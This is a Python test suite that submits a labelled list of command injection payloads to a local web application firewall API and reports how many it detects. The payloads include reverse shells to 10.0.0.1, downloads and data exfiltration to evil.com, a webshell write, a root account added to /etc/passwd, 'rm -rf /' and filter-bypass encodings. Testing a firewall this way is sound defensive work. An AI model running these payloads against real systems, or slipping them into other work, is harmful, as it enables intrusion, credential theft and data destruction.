#!/usr/bin/env python3
"""
Command Injection Attack Test Suite
Tests OS command injection techniques against the WAF
"""

import requests
import json
import time
from typing import Dict

WAF_API = "http://localhost:3001/api/waf/check"

# Command Injection Payloads
COMMAND_INJECTION_ATTACKS = [
    # Basic Command Chaining
    {"name": "Semicolon chain", "path": "/api/ping", "query": {"host": "127.0.0.1; cat /etc/passwd"}},
    {"name": "Pipe chain", "path": "/api/ping", "query": {"host": "127.0.0.1 | whoami"}},
    {"name": "AND chain", "path": "/api/check", "query": {"ip": "127.0.0.1 && id"}},
    {"name": "OR chain", "path": "/api/verify", "query": {"target": "invalid || cat /etc/shadow"}},
    {"name": "Newline chain", "path": "/api/exec", "query": {"cmd": "ls\ncat /etc/passwd"}},
    {"name": "Ampersand background", "path": "/api/run", "query": {"task": "sleep 1 & wget http://evil.com/shell.sh"}},

    # Backtick/Subshell Execution
    {"name": "Backtick exec", "path": "/api/process", "query": {"name": "`id`"}},
    {"name": "Dollar subshell", "path": "/api/lookup", "query": {"domain": "$(whoami).evil.com"}},
    {"name": "Nested subshell", "path": "/api/resolve", "query": {"host": "$(echo $(id))"}},

    # Reverse Shells
    {"name": "Bash reverse shell", "path": "/api/debug", "body": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"},
    {"name": "NC reverse shell", "path": "/api/test", "body": "nc -e /bin/bash 10.0.0.1 4444"},
    {"name": "Python reverse shell", "path": "/api/script", "body": "python -c 'import socket,subprocess;s=socket.socket();s.connect((\"10.0.0.1\",4444));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"},
    {"name": "Perl reverse shell", "path": "/api/cgi", "body": "perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(4444,inet_aton(\"10.0.0.1\")));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"},
    {"name": "PHP reverse shell", "path": "/api/upload", "body": "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"');?>"},

    # File Operations
    {"name": "Cat passwd", "path": "/api/file", "query": {"name": "; cat /etc/passwd"}},
    {"name": "Cat shadow", "path": "/api/read", "query": {"file": "| cat /etc/shadow"}},
    {"name": "Write webshell", "path": "/api/save", "body": "; echo '<?php system($_GET[\"cmd\"]);?>' > /var/www/shell.php"},
    {"name": "Download malware", "path": "/api/fetch", "query": {"url": "; wget http://evil.com/malware -O /tmp/pwned"}},
    {"name": "Curl exfil", "path": "/api/sync", "body": "; curl http://evil.com/?data=$(cat /etc/passwd | base64)"},

    # Privilege Escalation Commands
    {"name": "Sudo abuse", "path": "/api/admin", "body": "; sudo /bin/bash"},
    {"name": "SUID find", "path": "/api/search", "query": {"q": "; find / -perm -4000 2>/dev/null"}},
    {"name": "Passwd modify", "path": "/api/user", "body": "; echo 'hacker:x:0:0::/root:/bin/bash' >> /etc/passwd"},

    # Environment Variable Injection
    {"name": "PATH injection", "path": "/api/env", "body": "PATH=/tmp:$PATH; /tmp/evil"},
    {"name": "LD_PRELOAD", "path": "/api/lib", "body": "LD_PRELOAD=/tmp/evil.so /usr/bin/id"},
    {"name": "IFS manipulation", "path": "/api/parse", "query": {"data": "IFS=,;cat,/etc/passwd"}},

    # Encoded Payloads
    {"name": "Base64 encoded", "path": "/api/decode", "body": "; echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | bash"},
    {"name": "Hex encoded", "path": "/api/hex", "query": {"cmd": "; echo 6361742f6574632f706173737764 | xxd -r -p | bash"}},
    {"name": "URL encoded", "path": "/api/url", "query": {"input": "%3B%20cat%20%2Fetc%2Fpasswd"}},

    # Windows Commands
    {"name": "Windows dir", "path": "/api/list", "query": {"path": "& dir C:\\"}},
    {"name": "Windows type", "path": "/api/view", "query": {"file": "| type C:\\Windows\\System32\\config\\SAM"}},
    {"name": "Windows net user", "path": "/api/users", "query": {"filter": "& net user"}},
    {"name": "Windows powershell", "path": "/api/ps", "body": "& powershell -enc JABjAGwAaQBlAG4AdAA="},
    {"name": "Windows certutil", "path": "/api/cert", "body": "& certutil -urlcache -split -f http://evil.com/shell.exe shell.exe"},

    # Filter Bypass
    {"name": "Space bypass tab", "path": "/api/bypass", "query": {"cmd": "cat\t/etc/passwd"}},
    {"name": "Space bypass IFS", "path": "/api/bypass", "query": {"cmd": "cat${IFS}/etc/passwd"}},
    {"name": "Space bypass brace", "path": "/api/bypass", "query": {"cmd": "{cat,/etc/passwd}"}},
    {"name": "Wildcard bypass", "path": "/api/bypass", "query": {"cmd": "/???/??t /???/p??s??"}},
    {"name": "Quote bypass", "path": "/api/bypass", "query": {"cmd": "c''a''t /e''tc/pa''ss''wd"}},
    {"name": "Backslash bypass", "path": "/api/bypass", "query": {"cmd": "c\\a\\t /e\\tc/p\\asswd"}},
    {"name": "Variable bypass", "path": "/api/bypass", "query": {"cmd": "$({cat,/etc/passwd})"}},

    # DNS Exfiltration
    {"name": "DNS exfil whoami", "path": "/api/dns", "query": {"lookup": "$(whoami).evil.com"}},
    {"name": "DNS exfil data", "path": "/api/resolve", "body": "; nslookup $(cat /etc/passwd | base64 | head -c 60).evil.com"},

    # Time-based Detection
    {"name": "Sleep detection", "path": "/api/slow", "query": {"delay": "; sleep 10"}},
    {"name": "Ping detection", "path": "/api/latency", "query": {"test": "& ping -c 10 127.0.0.1"}},

    # Hidden in JSON
    {"name": "JSON field injection", "path": "/api/config", "body": {"setting": "value; rm -rf /", "enabled": True}},
    {"name": "JSON array injection", "path": "/api/batch", "body": {"commands": ["ls", "; cat /etc/passwd", "pwd"]}},
    {"name": "Filename injection", "path": "/api/upload", "body": {"filename": "test.txt; cat /etc/passwd #.jpg"}},
]

def test_payload(attack: Dict) -> Dict:
    """Test a single command injection payload against WAF"""
    payload = {
        "method": "POST" if "body" in attack else "GET",
        "path": attack["path"],
        "query_params": attack.get("query", {}),
        "headers": {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Accept": "*/*",
            "Content-Type": "application/json"
        }
    }

    body = attack.get("body")
    if body:
        payload["body"] = json.dumps(body) if isinstance(body, dict) else body

    try:
        response = requests.post(WAF_API, json=payload, timeout=10)
        result = response.json()
        return {
            "name": attack["name"],
            "detected": result.get("is_anomaly", False),
            "score": result.get("anomaly_score", 0),
            "time_ms": result.get("processing_time_ms", 0)
        }
    except Exception as e:
        return {"name": attack["name"], "error": str(e)}

def main():
    print("=" * 70)
    print("COMMAND INJECTION ATTACK TEST SUITE")
    print("=" * 70)
    print(f"Testing {len(COMMAND_INJECTION_ATTACKS)} command injection payloads...\n")

    detected = 0
    missed = 0
    errors = 0

    for i, attack in enumerate(COMMAND_INJECTION_ATTACKS, 1):
        result = test_payload(attack)

        if "error" in result:
            status = "\033[93m[ERROR]\033[0m"
            errors += 1
        elif result["detected"]:
            status = "\033[92m[BLOCKED]\033[0m"
            detected += 1
        else:
            status = "\033[91m[MISSED]\033[0m"
            missed += 1

        score = result.get("score", 0)
        print(f"[{i:02d}/{len(COMMAND_INJECTION_ATTACKS)}] {status} {result['name'][:40]:<40} Score: {score:.4f}")
        time.sleep(0.05)

    print("\n" + "=" * 70)
    print("SUMMARY")
    print("=" * 70)
    print(f"Total Tests:  {len(COMMAND_INJECTION_ATTACKS)}")
    print(f"\033[92mBlocked:      {detected}\033[0m")
    print(f"\033[91mMissed:       {missed}\033[0m")
    print(f"\033[93mErrors:       {errors}\033[0m")
    detection_rate = detected / (len(COMMAND_INJECTION_ATTACKS) - errors) * 100 if (len(COMMAND_INJECTION_ATTACKS) - errors) > 0 else 0
    print(f"Detection Rate: {detection_rate:.1f}%")
    print("=" * 70)

if __name__ == "__main__":
    main()
